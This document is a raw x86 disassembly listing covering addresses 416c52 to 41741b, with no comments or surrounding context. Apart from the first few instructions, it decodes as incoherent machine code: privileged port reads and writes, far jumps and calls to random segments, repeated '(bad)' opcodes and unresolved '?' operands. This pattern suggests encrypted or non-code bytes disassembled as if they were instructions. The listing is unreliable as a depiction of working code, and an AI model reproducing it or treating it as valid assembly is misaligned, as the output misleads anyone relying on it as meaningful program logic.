  416c52:	mov    edx,DWORD PTR [ebp+0x8]
  416c55:	mov    ebx,DWORD PTR [ebp-0x8]
  416c58:	xor    edx,eax
  416c5a:	jmp    0x418fb9
  416c5f:	test   BYTE PTR fs:[esi],bl
  416c62:	pop    es
  416c63:	sahf   
  416c64:	and    DWORD PTR [edx-0x80],0x235b4cfa
  416c6b:	je     0x416c79
  416c6d:	ins    DWORD PTR es:[edi],dx
  416c6e:	push   DWORD PTR [ecx+0x42]
  416c71:	jl     0x416bf6
  416c73:	cmp    eax,0x1583835e
  416c78:	clc    
  416c79:	xlat   BYTE PTR ds:[ebx]
  416c7a:	and    ebp,DWORD PTR [edi]
  416c7c:	mov    esp,0x6565564b
  416c81:	push   esp
  416c82:	shl    esi,0xa3
  416c85:	pop    eax
  416c86:	pop    ds
  416c87:	cmc    
  416c88:	sti    
  416c89:	push   ebx
  416c8a:	xor    eax,0xeb785321
  416c8f:	pop    esi
  416c90:	or     al,0xef
  416c92:	in     al,dx
  416c93:	jo     0x416ce2
  416c95:	repnz or al,BYTE PTR [ecx]
  416c98:	cmc    
  416c99:	mov    edx,0xa9cb83c7
  416c9e:	aaa    
  416c9f:	mov    cl,ah
  416ca1:	test   DWORD PTR [ecx-0x27],esp
  416ca4:	call   0xc18a:0x70775db0
  416cab:	in     eax,0x9c
  416cad:	push   ds
  416cae:	add    dh,BYTE PTR [eax]
  416cb0:	mov    ebp,DWORD PTR [ebx-0x1ed5a8b3]
  416cb6:	mov    ecx,0xa0181966
  416cbb:	xchg   esi,eax
  416cbc:	or     DWORD PTR [edx+0x5ef13443],ebp
  416cc2:	sbb    al,0xa2
  416cc4:	ins    BYTE PTR es:[edi],dx
  416cc5:	fadd   QWORD PTR [ebp+0x56]
  416cc8:	pop    ebp
  416cc9:	cdq    
  416cca:	lods   al,BYTE PTR ds:[esi]
  416ccb:	in     al,0xff
  416ccd:	loopne 0x416c55
  416ccf:	data16 aam 0xa9
  416cd2:	push   eax
  416cd3:	add    DWORD PTR [ebx-0x55923fb2],0x6
  416cda:	arpl   WORD PTR [ecx],ax
  416cdc:	mov    WORD PTR [ebp-0x35553c2c],es
  416ce2:	imul   ecx,DWORD PTR [eax],0xffffffb6
  416ce5:	test   BYTE PTR [esp+eiz*4-0x4],0x1c
  416cea:	sub    eax,0x93b96c05
  416cef:	xor    al,0xa6
  416cf1:	cmc    
  416cf2:	js     0x416c99
  416cf4:	lods   al,BYTE PTR ds:[esi]
  416cf5:	int3   
  416cf6:	xor    eax,edx
  416cf8:	adc    bl,dl
  416cfa:	rol    ah,0x84
  416cfd:	mov    ch,0xd0
  416cff:	add    BYTE PTR [ebp-0x3bde131f],ch
  416d05:	daa    
  416d06:	cmp    ebx,0x1d39fd72
  416d0c:	outs   dx,DWORD PTR ds:[esi]
  416d0d:	lock lds ebx,FWORD PTR [ebx]
  416d10:	adc    bh,BYTE PTR [edi-0x3]
  416d13:	scas   eax,DWORD PTR es:[edi]
  416d14:	scas   eax,DWORD PTR es:[edi]
  416d15:	fdivr  QWORD PTR [eax+edi*2]
  416d18:	xor    al,0xef
  416d1a:	imul   ebp,DWORD PTR [ebp+0x74],0xcec14b1f
  416d21:	stc    
  416d22:	lods   al,BYTE PTR ds:[esi]
  416d23:	imul   BYTE PTR [eax]
  416d25:	jo     0x416d48
  416d27:	push   cs
  416d28:	sub    eax,DWORD PTR [esi-0x42]
  416d2b:	jg     0x416cfc
  416d2d:	pop    edx
  416d2e:	test   eax,0x5be6964
  416d33:	add    ebp,DWORD PTR [ebx]
  416d35:	fs out 0x14,al
  416d38:	jle    0x416cbf
  416d3a:	enter  0xc866,0x2f
  416d3e:	xor    eax,0xedb63719
  416d43:	sub    esi,esi
  416d45:	scas   al,BYTE PTR es:[edi]
  416d46:	jns    0x416d9e
  416d48:	aam    0xde
  416d4a:	jmp    0xd1f0:0xf387d84b
  416d51:	inc    edx
  416d52:	fdiv   QWORD PTR [eax+eax*4-0x46]
  416d56:	fwait
  416d57:	or     DWORD PTR [esi],esp
  416d59:	inc    ecx
  416d5a:	sub    eax,edi
  416d5c:	or     DWORD PTR [esi],esp
  416d5e:	xchg   edx,eax
  416d5f:	jo     0x416ce5
  416d61:	test   al,0x6e
  416d63:	call   0x50d12b7b
  416d68:	jo     0x416daa
  416d6a:	add    dl,BYTE PTR [esi+0x18]
  416d6d:	in     eax,0x11
  416d6f:	icebp  
  416d70:	shl    eax,cl
  416d72:	ret    0x190a
  416d75:	fld    TBYTE PTR [eax+ebx*4+0x21747858]
  416d7c:	sbb    al,0xa7
  416d7e:	pop    es
  416d7f:	shl    al,1
  416d81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d82:	(bad)  
  416d84:	xchg   esp,eax
  416d85:	jns    0x416d10
  416d87:	cld    
  416d88:	add    eax,0x7c843c48
  416d8d:	es inc ecx
  416d8f:	xchg   ebp,eax
  416d90:	pop    es
  416d91:	retf   
  416d92:	jnp    0x416d84
  416d94:	sbb    esp,eax
  416d96:	cwde   
  416d97:	popf   
  416d98:	loop   0x416d95
  416d9a:	sbb    eax,0x88e53c68
  416d9f:	mov    bl,0x31
  416da1:	mov    bh,cl
  416da3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416da4:	popf   
  416da5:	mov    ah,0x2
  416da7:	mov    eax,0x2a5a6461
  416dac:	outs   dx,DWORD PTR ds:[esi]
  416dad:	addr16 dec ebx
  416daf:	daa    
  416db0:	test   al,0x73
  416db2:	test   eax,0x1ccdd752
  416db7:	sub    DWORD PTR [eax+0x548fcbb3],eax
  416dbd:	fcom   st(7)
  416dbf:	mov    dh,0xbb
  416dc1:	ret    
  416dc2:	pop    ecx
  416dc3:	push   edx
  416dc4:	pop    eax
  416dc5:	ret    
  416dc6:	jmp    0x6181:0xc1dd399e
  416dcd:	test   BYTE PTR [edx-0x29],dh
  416dd0:	jbe    0x416e3b
  416dd2:	cmp    BYTE PTR [ebp-0x455f7d56],ch
  416dd8:	inc    esp
  416dd9:	cwde   
  416dda:	fldcw  WORD PTR [eax+0x12]
  416ddd:	mov    dh,0x4b
  416ddf:	sub    dl,BYTE PTR [ebp+edi*1-0x4d8ddc06]
  416de6:	sti    
  416de7:	addr16 add al,0xc
  416dea:	xchg   edx,eax
  416deb:	clc    
  416dec:	mov    dh,0x68
  416dee:	pop    esi
  416def:	xor    al,0xc5
  416df1:	mov    eax,ds:0xfc698b87
  416df6:	push   0x28ad13f0
  416dfb:	or     ch,ah
  416dfd:	add    al,0x86
  416dff:	fwait
  416e00:	mov    WORD PTR [ebx],?
  416e02:	leave  
  416e03:	je     0x416e48
  416e05:	in     eax,0x45
  416e07:	pop    esi
  416e08:	cs cmp al,0xe0
  416e0b:	and    eax,DWORD PTR [eax+0x3fb22fa0]
  416e11:	int3   
  416e12:	mov    al,0x1
  416e14:	dec    edx
  416e15:	lods   eax,DWORD PTR cs:[esi]
  416e17:	xchg   ebx,eax
  416e18:	mov    ch,0x36
  416e1a:	push   es
  416e1b:	adc    al,0xe
  416e1d:	mov    ebp,0xcfe1152f
  416e22:	mov    bl,0x30
  416e24:	stos   BYTE PTR es:[edi],al
  416e25:	out    0x72,eax
  416e27:	add    ebp,0xffffffc8
  416e2a:	push   ecx
  416e2b:	retf   
  416e2c:	and    DWORD PTR [eax],ecx
  416e2e:	bound  edx,QWORD PTR [ebx+0x786cef04]
  416e34:	(bad)  
  416e35:	or     al,0x51
  416e37:	aam    0x82
  416e39:	scas   eax,DWORD PTR es:[edi]
  416e3a:	xor    BYTE PTR [edi-0x5f36fcc0],bh
  416e40:	sub    BYTE PTR [ebx+0x53],bl
  416e43:	jns    0x416e44
  416e45:	cmp    DWORD PTR [esi+0x2db06396],esp
  416e4b:	js     0x416eb5
  416e4d:	add    eax,DWORD PTR [ebx-0xa6305ae]
  416e53:	pop    es
  416e54:	ror    BYTE PTR [esi],0xd
  416e57:	in     eax,dx
  416e58:	mov    cl,0x2d
  416e5a:	pop    ebx
  416e5b:	mov    esi,DWORD PTR [esi]
  416e5d:	out    dx,eax
  416e5e:	or     edi,DWORD PTR [edx-0x3f]
  416e61:	repz int3 
  416e63:	addr16 and ecx,ebx
  416e66:	std    
  416e67:	inc    edi
  416e68:	jmp    DWORD PTR [esi+0x3fa0dd72]
  416e6e:	and    ebx,DWORD PTR [esi+eiz*1+0x77]
  416e72:	call   0x2fc5798c
  416e77:	loopne 0x416ed5
  416e79:	xchg   ebp,eax
  416e7a:	gs dec ecx
  416e7c:	sbb    dl,dh
  416e7e:	jbe    0x416e6e
  416e80:	sbb    BYTE PTR [ecx],0xfe
  416e83:	mov    dh,0x23
  416e85:	or     al,0x60
  416e87:	popa   
  416e88:	test   eax,0xc19610ea
  416e8d:	es jmp 0x1f55:0x83846602
  416e95:	pop    ebp
  416e96:	adc    cl,BYTE PTR [eax+ecx*4-0x532c928f]
  416e9d:	into   
  416e9e:	add    al,0xd6
  416ea0:	mov    ah,0xf8
  416ea2:	push   ebp
  416ea3:	sub    dh,BYTE PTR [ecx-0x62]
  416ea6:	loope  0x416ec1
  416ea8:	gs ret 0x2313
  416eac:	stc    
  416ead:	jns    0x416f04
  416eaf:	outs   dx,BYTE PTR ds:[esi]
  416eb0:	jo     0x416e6a
  416eb2:	into   
  416eb3:	or     DWORD PTR [si-0x59],ecx
  416eb7:	(bad)  
  416eb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416eb9:	jmp    0x868e:0x54843883
  416ec0:	xchg   dl,dh
  416ec2:	call   0xfb7c0720
  416ec7:	lock daa 
  416ec9:	loop   0x416e5e
  416ecb:	std    
  416ecc:	xor    DWORD PTR [eax-0x5f],0x34
  416ed0:	xor    ch,BYTE PTR [eax-0x753efadf]
  416ed6:	xchg   DWORD PTR [eax+0xd],edx
  416ed9:	mov    cl,0x6e
  416edb:	jge    0x416f0f
  416edd:	imul   ebx,ebx,0xb3255192
  416ee3:	inc    ecx
  416ee4:	inc    esi
  416ee5:	jge    0x416f23
  416ee7:	stos   DWORD PTR es:[edi],eax
  416ee8:	out    dx,eax
  416ee9:	dec    ecx
  416eea:	cmc    
  416eeb:	repnz mov edi,0xef6b7d1
  416ef1:	mov    ebp,0x9fb2ea54
  416ef6:	jnp    0x416e9d
  416ef8:	and    BYTE PTR [edi+esi*8],cl
  416efb:	and    eax,0x80ea1b7c
  416f00:	cs push ss
  416f02:	pop    ss
  416f03:	lock lds esi,FWORD PTR [edx-0x20]
  416f07:	xchg   DWORD PTR ds:0x718106,edi
  416f0d:	cmp    bl,BYTE PTR [ecx-0x36]
  416f10:	push   ebx
  416f11:	jae    0x416f6a
  416f13:	in     al,dx
  416f14:	lds    ebp,FWORD PTR [eax+0xa13857]
  416f1a:	xchg   ecx,eax
  416f1b:	dec    ecx
  416f1c:	mov    BYTE PTR gs:[ebx-0x41],bh
  416f20:	cmp    al,0xb4
  416f22:	sbb    esi,edi
  416f24:	sbb    dl,cl
  416f26:	sbb    esp,DWORD PTR [ebx-0x2c1f0feb]
  416f2c:	fwait
  416f2d:	jl     0x4eb4182f
  416f33:	push   edx
  416f34:	inc    ebx
  416f35:	push   ebp
  416f36:	test   ecx,ebx
  416f38:	not    BYTE PTR [edi-0x77bc3d7f]
  416f3e:	mov    WORD PTR [edi-0x67],gs
  416f41:	pushf  
  416f42:	mov    edi,0x135e1568
  416f47:	jns    0x416fb2
  416f49:	retf   0xabde
  416f4c:	pop    ds
  416f4d:	or     al,0x1
  416f4f:	dec    edx
  416f50:	mov    eax,0xbd3b9e55
  416f55:	add    dh,cl
  416f57:	retf   0x5767
  416f5a:	and    BYTE PTR [edx-0x3b40d7ce],ch
  416f60:	test   BYTE PTR [edi],al
  416f62:	(bad)  
  416f63:	pusha  
  416f64:	sub    ch,BYTE PTR [ecx+0x4413b242]
  416f6a:	mov    edx,DWORD PTR [edx+0x711cec07]
  416f70:	push   cs
  416f71:	pushf  
  416f72:	pop    esi
  416f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f74:	ss es or al,0x56
  416f78:	imul   eax,DWORD PTR [eax],0x5f
  416f7b:	ret    0xcd82
  416f7e:	adc    eax,0x23344db1
  416f83:	fstp   DWORD PTR [edi+0x15b4e638]
  416f89:	jne    0x416f98
  416f8b:	inc    eax
  416f8c:	mov    ebp,0xece051d
  416f91:	lahf   
  416f92:	inc    edi
  416f93:	es in  eax,dx
  416f95:	mov    BYTE PTR [esp+esi*8+0x120759f],cl
  416f9c:	ret    0x5561
  416f9f:	cmp    BYTE PTR [ebx+0x46e75e05],0xac
  416fa6:	std    
  416fa7:	push   0x78
  416fa9:	out    dx,eax
  416faa:	push   edx
  416fab:	ret    0x90df
  416fae:	xor    bl,ch
  416fb0:	or     DWORD PTR [ebx-0x10],esp
  416fb3:	mov    ch,dh
  416fb5:	pusha  
  416fb6:	loop   0x416f80
  416fb8:	and    ch,BYTE PTR [esi]
  416fba:	ds or  esi,0x6a68edb9
  416fc1:	dec    edx
  416fc2:	rcr    DWORD PTR ds:0xbfa10852,cl
  416fc8:	lahf   
  416fc9:	ins    BYTE PTR es:[edi],dx
  416fca:	je     0x416fbd
  416fcc:	ss jns 0x417003
  416fcf:	sub    esp,esp
  416fd1:	cmp    ah,bh
  416fd3:	cmp    edi,DWORD PTR [ebx-0x38]
  416fd6:	lods   al,BYTE PTR ds:[esi]
  416fd7:	(bad)
  416fda:	bound  edx,QWORD PTR [ecx+0x49]
  416fdd:	test   edx,esi
  416fdf:	add    eax,0x9bf90a66
  416fe4:	test   eax,0x30e207c0
  416fe9:	scas   eax,DWORD PTR es:[edi]
  416fea:	mov    dh,0x1d
  416fec:	push   0xc45c9cd8
  416ff1:	mov    BYTE PTR [ebx-0x19d70e53],0x42
  416ff8:	ret    0xdfe3
  416ffb:	mov    eax,0x8aa5b6e4
  417000:	aaa    
  417001:	and    eax,0x15a8e05
  417006:	lods   al,BYTE PTR ds:[esi]
  417007:	cmp    esi,edi
  417009:	retf   
  41700a:	aaa    
  41700b:	fdivr  DWORD PTR [ecx-0x65]
  41700e:	ss pop es
  417010:	inc    eax
  417011:	sbb    al,0x2d
  417013:	sti    
  417014:	or     BYTE PTR [edx+0xef0013f],0x7
  41701b:	in     al,dx
  41701c:	(bad)  
  41701d:	fs ret 
  41701f:	outs   dx,DWORD PTR ds:[esi]
  417020:	mov    bl,0x9
  417022:	push   ebx
  417023:	out    dx,al
  417024:	xchg   edi,eax
  417025:	push   0x1d
  417027:	and    DWORD PTR [edi-0x6],0xffffff93
  41702b:	popa   
  41702c:	jge    0x416fde
  41702e:	test   eax,0x1abf29eb
  417033:	(bad)  
  417034:	int3   
  417035:	fmul   QWORD PTR [eax+ecx*2]
  417038:	jb     0x2399cbeb
  41703e:	fcmovne st,st(6)
  417040:	sbb    BYTE PTR [edi+0x51],bl
  417043:	or     BYTE PTR [esp+ebp*8-0x722d8c29],dh
  41704a:	into   
  41704b:	xchg   esi,eax
  41704c:	lods   al,BYTE PTR ds:[esi]
  41704d:	sbb    DWORD PTR [edx],eax
  41704f:	jg     0x4170cf
  417051:	pusha  
  417052:	in     eax,0xf2
  417054:	ror    BYTE PTR ds:0x4e7d8ff1,cl
  41705a:	fnstenv [eax+0x1906d320]
  417060:	sbb    al,0xc8
  417062:	mov    es,WORD PTR [esi+edi*8]
  417065:	sti    
  417066:	add    esi,DWORD PTR [edx-0x370527d5]
  41706c:	xchg   BYTE PTR [ebx+0x46],ch
  41706f:	scas   eax,DWORD PTR es:[edi]
  417070:	fnstcw WORD PTR [edi-0x3a]
  417073:	test   ebx,0x19911ca6
  417079:	js     0x417063
  41707b:	into   
  41707c:	fwait
  41707d:	hlt    
  41707e:	stos   DWORD PTR es:[edi],eax
  41707f:	jb     0x41709f
  417081:	lods   eax,DWORD PTR ds:[esi]
  417082:	or     esi,esp
  417084:	cs cdq 
  417086:	add    al,0x59
  417088:	dec    ecx
  417089:	stc    
  41708a:	inc    ecx
  41708b:	sub    DWORD PTR [ecx-0x37],eax
  41708e:	sbb    edx,DWORD PTR [edx-0x3]
  417091:	sti    
  417092:	dec    edi
  417093:	and    dh,bl
  417095:	rol    esp,cl
  417097:	adc    ebx,DWORD PTR [edi+0x40324a82]
  41709d:	popf   
  41709e:	call   0xabe2:0xf6c21b2b
  4170a5:	fistp  QWORD PTR [edx+0x29edf72e]
  4170ab:	out    0x72,al
  4170ad:	bound  ebx,QWORD PTR [edx+eax*1]
  4170b0:	sbb    BYTE PTR [ebx-0x73],al
  4170b3:	push   eax
  4170b4:	arpl   WORD PTR [ecx],di
  4170b6:	mov    esi,DWORD PTR [eax-0x7]
  4170b9:	sbb    eax,0x1430454f
  4170be:	(bad)  
  4170bf:	loope  0x4170f7
  4170c1:	xlat   BYTE PTR ds:[ebx]
  4170c2:	iret   
  4170c3:	test   BYTE PTR [esi-0x61f991ca],bh
  4170c9:	mov    edi,?
  4170cb:	inc    esp
  4170cc:	ds dec esi
  4170ce:	inc    esi
  4170cf:	sahf   
  4170d0:	and    bl,cl
  4170d2:	xchg   edi,eax
  4170d3:	pop    ds
  4170d4:	test   DWORD PTR [ebp+eax*2-0x26],ebx
  4170d8:	push   0xffffff9b
  4170da:	mov    cs,WORD PTR [esi+0x1151937a]
  4170e0:	(bad)  
  4170e1:	scas   al,BYTE PTR es:[edi]
  4170e2:	test   DWORD PTR [esi-0xa],ecx
  4170e5:	or     BYTE PTR [ecx-0x7a4cabc4],ch
  4170eb:	jge    0x417148
  4170ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170ee:	popa   
  4170ef:	cmp    al,0x7b
  4170f1:	pop    es
  4170f2:	sub    DWORD PTR [edx+0x42],0xe537521
  4170f9:	imul   esp,DWORD PTR [eax+0x5961356],0x2c
  417100:	jp     0x4170ea
  417102:	dec    ebx
  417103:	add    ebx,DWORD PTR [ebx+0x6ea9483b]
  417109:	rcr    BYTE PTR [ebx+ebp*1],0x42
  41710d:	cmp    ah,BYTE PTR [eax+0x437912ef]
  417113:	aas    
  417114:	mov    dl,BYTE PTR [ecx+0x58530b3]
  41711a:	pop    esi
  41711b:	dec    edx
  41711c:	ins    DWORD PTR es:[edi],dx
  41711d:	dec    ebx
  41711e:	mov    ah,0xef
  417120:	pminsw mm0,QWORD PTR [esp+eiz*4-0x2c]
  417125:	adc    edi,0x51
  417128:	jmp    FWORD PTR ds:0x96ed32fa
  41712e:	adc    BYTE PTR [ecx],bh
  417130:	stos   DWORD PTR es:[edi],eax
  417131:	repz cs jl 0x4170d6
  417135:	or     eax,0xdcbc30c2
  41713a:	lods   eax,DWORD PTR ds:[esi]
  41713b:	in     eax,dx
  41713c:	ins    BYTE PTR es:[edi],dx
  41713d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41713e:	add    edx,DWORD PTR [esi-0x1b60ee11]
  417144:	and    eax,0x166d4894
  417149:	rcl    cl,cl
  41714b:	and    al,0xbc
  41714d:	lahf   
  41714e:	xor    eax,0x8ed9e52b
  417153:	mov    bh,0xf1
  417155:	mul    BYTE PTR [edx]
  417157:	and    BYTE PTR [edx],0xc8
  41715a:	pop    eax
  41715b:	mov    ebx,0xd050175e
  417160:	and    cl,dl
  417162:	outs   dx,DWORD PTR ds:[esi]
  417163:	xor    eax,0xf52819fa
  417168:	mov    al,ds:0xf6929bf0
  41716d:	popf   
  41716e:	sub    cl,dh
  417170:	cmp    al,0x96
  417172:	jne    0x417124
  417174:	push   ecx
  417175:	pop    ecx
  417176:	add    eax,0x2c12d011
  41717b:	jl     0x417186
  41717d:	sbb    eax,0x96d6238e
  417182:	fbld   TBYTE PTR [edi]
  417184:	mov    ah,0xa
  417186:	and    al,dh
  417188:	in     eax,0xe5
  41718a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41718b:	jmp    0x41711c
  41718d:	ror    DWORD PTR [ebx-0x55],0xaa
  417191:	div    DWORD PTR [edx+0x5a]
  417194:	test   al,0x65
  417196:	nop
  417197:	jne    0x4171ab
  417199:	out    dx,eax
  41719a:	or     ebx,DWORD PTR [ebx]
  41719c:	or     edx,DWORD PTR [esi+0x2b]
  41719f:	es loop 0x417218
  4171a2:	adc    BYTE PTR [ebx+0x19daa08],bh
  4171a8:	push   ebx
  4171a9:	and    DWORD PTR [edi-0x7af8cfc],eax
  4171af:	jmp    0xa0a:0xb11665e3
  4171b6:	ret    0x1f3d
  4171b9:	js     0x417237
  4171bb:	jle    0x4171b9
  4171bd:	(bad)  
  4171be:	int3   
  4171bf:	nop
  4171c0:	out    0xc,eax
  4171c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171c3:	xchg   edx,eax
  4171c4:	pop    ebp
  4171c5:	outs   dx,DWORD PTR ds:[esi]
  4171c6:	fld    DWORD PTR ds:0xdf1afe96
  4171cc:	fwait
  4171cd:	repz sar DWORD PTR [edi],1
  4171d0:	push   eax
  4171d1:	pavgb  mm3,mm2
  4171d4:	xor    DWORD PTR ds:0x44f835dd,esi
  4171da:	push   DWORD PTR [edi]
  4171dc:	inc    ebx
  4171dd:	xchg   ebx,eax
  4171de:	add    DWORD PTR [esi+0x36],eax
  4171e1:	jecxz  0x41724b
  4171e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171e4:	int    0x97
  4171e6:	pop    edx
  4171e7:	in     eax,dx
  4171e8:	clc    
  4171e9:	sub    ebx,esi
  4171eb:	sbb    eax,0xd9296dee
  4171f0:	pop    ds
  4171f1:	mov    dl,0x47
  4171f3:	neg    DWORD PTR [ecx+0x4c]
  4171f6:	retf   0xb780
  4171f9:	fs jmp 0xc26:0x6cf9cc9a
  417201:	shl    DWORD PTR [esi*4+0x34182104],cl
  417208:	adc    DWORD PTR [edi],ebp
  41720a:	sub    cl,BYTE PTR [ecx+ecx*1+0x550f53ab]
  417211:	jge    0x4171ea
  417213:	test   eax,0x78a6ec4a
  417218:	and    al,0xd6
  41721a:	pop    ds
  41721b:	mov    esp,0x15dbe5ca
  417220:	push   ss
  417221:	mov    al,0x1
  417223:	data16 es je 0x417234
  417227:	mov    ch,0x4c
  417229:	repnz out 0xbf,eax
  41722c:	stos   BYTE PTR es:[edi],al
  41722d:	(bad)  
  41722f:	pop    esp
  417230:	cs cwde 
  417232:	or     esp,esi
  417234:	jmp    0xd76b:0x260e28a6
  41723b:	test   eax,0x97a9e770
  417240:	pushf  
  417241:	ins    DWORD PTR es:[edi],dx
  417242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417243:	sub    DWORD PTR [ebp-0x72],0x33
  417247:	loop   0x41726c
  417249:	adc    al,0x86
  41724b:	in     al,0x4c
  41724d:	retf   0xb8bd
  417250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417251:	repz jg 0x4172cd
  417254:	inc    ebp
  417255:	xchg   edx,esi
  417257:	dec    edx
  417258:	(bad)  
  417259:	call   0xb869:0x95de2c9a
  417260:	or     DWORD PTR [edi+0x18936911],esp
  417266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417267:	mov    ecx,0x8f95178d
  41726c:	cmp    DWORD PTR [eax+0x3b],ecx
  41726f:	sub    BYTE PTR [edi-0x1c816a5b],0x3e
  417276:	(bad)  
  417277:	popf   
  417278:	xor    DWORD PTR [edx],eax
  41727a:	mov    WORD PTR [ecx+0x30],ds
  41727d:	cmp    BYTE PTR [eax-0x23],ch
  417280:	push   ebp
  417281:	xor    eax,0xb29f33bb
  417286:	xchg   edx,eax
  417287:	js     0x41729f
  417289:	test   eax,0x34dec5b
  41728e:	or     DWORD PTR [ecx-0x5a],edx
  417291:	mov    esi,edi
  417293:	sbb    dl,BYTE PTR ds:0xc88ff037
  417299:	or     al,0xbb
  41729b:	stos   DWORD PTR es:[edi],eax
  41729c:	ret    0x867e
  41729f:	dec    edx
  4172a0:	int    0x43
  4172a2:	push   esp
  4172a3:	sub    dl,dl
  4172a5:	jno    0x4172ca
  4172a7:	dec    edx
  4172a8:	and    DWORD PTR ds:0x4575b43,esi
  4172ae:	into   
  4172af:	add    DWORD PTR [ebx],ebx
  4172b1:	or     ecx,DWORD PTR [ebx]
  4172b3:	in     al,dx
  4172b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172b5:	pop    edi
  4172b6:	das    
  4172b7:	cld    
  4172b8:	and    esi,ebx
  4172ba:	in     eax,0x45
  4172bc:	sahf   
  4172bd:	(bad)  
  4172be:	je     0x41728e
  4172c0:	and    eax,0xc89d0271
  4172c5:	mov    eax,ds:0x644ea467
  4172ca:	test   DWORD PTR [esi+0x24],edx
  4172cd:	xchg   ebp,eax
  4172ce:	mov    ch,0x3d
  4172d0:	sub    BYTE PTR [ecx-0x44],bl
  4172d3:	mov    dh,0x6e
  4172d5:	pop    esp
  4172d6:	mov    ds:0xef35be04,al
  4172db:	pushf  
  4172dc:	js     0x4172e5
  4172de:	retf   0x81d7
  4172e1:	cmp    DWORD PTR [ebx+0x10],ebp
  4172e4:	push   edi
  4172e5:	ret    0x71ea
  4172e8:	pop    ds
  4172e9:	mov    cl,0x10
  4172eb:	sbb    esp,ecx
  4172ed:	xor    ebp,DWORD PTR [ebx-0x68281c4]
  4172f3:	sar    al,0xc8
  4172f6:	daa    
  4172f7:	outs   dx,DWORD PTR ds:[esi]
  4172f8:	dec    esi
  4172f9:	mov    eax,ds:0xe3fdb7f9
  4172fe:	cdq    
  4172ff:	cmp    BYTE PTR [ecx+0x549c0e41],ch
  417305:	std    
  417306:	into   
  417307:	dec    edi
  417308:	xchg   edx,eax
  417309:	lock js 0x417325
  41730c:	ror    BYTE PTR [ebx+edi*8-0x29],0xfa
  417311:	add    DWORD PTR [ecx-0x142b8f42],0x41
  417318:	sbb    al,0xa8
  41731a:	test   eax,0xf8d07e45
  41731f:	pop    edx
  417320:	push   esi
  417321:	sti    
  417322:	into   
  417323:	popa   
  417324:	fwait
  417325:	add    al,BYTE PTR [ebx+0x1b]
  417328:	inc    ecx
  417329:	adc    al,0x97
  41732c:	mov    eax,ecx
  41732e:	xor    dl,BYTE PTR [ebp+0x53]
  417331:	add    eax,0x57e5d881
  417336:	inc    ecx
  417337:	and    ebp,esi
  417339:	dec    edx
  41733a:	xor    BYTE PTR [eax-0x4d],ah
  41733d:	enter  0xce47,0x81
  417341:	jbe    0x41737c
  417343:	pop    esp
  417344:	xor    ecx,DWORD PTR [esi+0x40b83860]
  41734a:	mov    WORD PTR [esi-0x5aec3c1f],cs
  417350:	adc    eax,DWORD PTR [ebx-0x5a]
  417353:	xchg   ebp,eax
  417354:	push   cs
  417355:	in     al,0x74
  417357:	loope  0x4173a8
  417359:	aas    
  41735a:	xchg   edi,eax
  41735b:	aam    0xfd
  41735d:	and    DWORD PTR [edx-0x6785b330],edx
  417363:	test   al,0x13
  417365:	jb     0x4173ab
  417367:	lds    ebp,FWORD PTR [eax+eax*1-0x6]
  41736b:	sbb    ebp,DWORD PTR [ebx-0x4a]
  41736e:	and    esi,0xc272bd49
  417374:	xlat   BYTE PTR ds:[ebx]
  417375:	stos   DWORD PTR es:[edi],eax
  417376:	jmp    0x33ed88d
  41737b:	aad    0x53
  41737d:	cs test al,0xa8
  417380:	icebp  
  417381:	push   ebp
  417382:	jmp    0xcbf9:0x94a25696
  417389:	out    0x6d,al
  41738b:	dec    ebx
  41738c:	jno    0x4173b6
  41738e:	imul   ebp,DWORD PTR [ebx-0x67],0xffffffdb
  417392:	push   es
  417393:	mov    ds:0x3c22edb0,eax
  417398:	pop    esi
  417399:	mov    eax,0x7ec1d0fe
  41739e:	shl    BYTE PTR [esi*4+0x3a744810],0xa8
  4173a6:	aaa    
  4173a7:	cmp    eax,0xfc43baf4
  4173ac:	stos   DWORD PTR es:[edi],eax
  4173ad:	clc    
  4173ae:	inc    eax
  4173af:	mov    eax,0x98720869
  4173b4:	adc    BYTE PTR [ecx],dl
  4173b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173b7:	push   ebp
  4173b8:	push   ds
  4173b9:	cwde   
  4173ba:	or     al,0x8
  4173bc:	and    BYTE PTR [ecx-0x22],dh
  4173bf:	xor    edx,edx
  4173c1:	sbb    esp,DWORD PTR [edx+edx*1]
  4173c4:	mov    cl,0xde
  4173c6:	inc    esp
  4173c7:	mov    ebx,0x88031e48
  4173cc:	inc    esi
  4173cd:	xchg   edi,eax
  4173ce:	mov    eax,ds:0x21def6a7
  4173d3:	lods   eax,DWORD PTR ds:[esi]
  4173d4:	pop    ds
  4173d5:	mov    esp,0xcf9fc9ad
  4173da:	xor    esi,DWORD PTR [edx]
  4173dc:	ret    
  4173dd:	aad    0xd7
  4173df:	mov    bh,0xab
  4173e1:	jge    0x41742f
  4173e3:	mov    dl,0xea
  4173e5:	jb     0x417400
  4173e7:	or     edx,DWORD PTR [edx]
  4173e9:	fsubr  QWORD PTR [eax]
  4173eb:	xor    ebp,DWORD PTR gs:[edi+0x725f444e]
  4173f2:	jno    0x4173a9
  4173f4:	push   esp
  4173f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173f6:	(bad)  ds:0x95dfef14
  4173fc:	outs   dx,DWORD PTR ds:[esi]
  4173fd:	clc    
  4173fe:	ins    DWORD PTR es:[edi],dx
  4173ff:	(bad)  
  417400:	punpckhdq mm3,mm5
  417403:	mov    ds:0x1f22755f,al
  417408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417409:	mov    edi,0x313db01e
  41740e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41740f:	or     esp,DWORD PTR [edx+0x47adc51d]
  417415:	js     0x417482
  417417:	xchg   ecx,eax
  417418:	dec    esi
  417419:	test   al,0xda
  41741b:	sti    
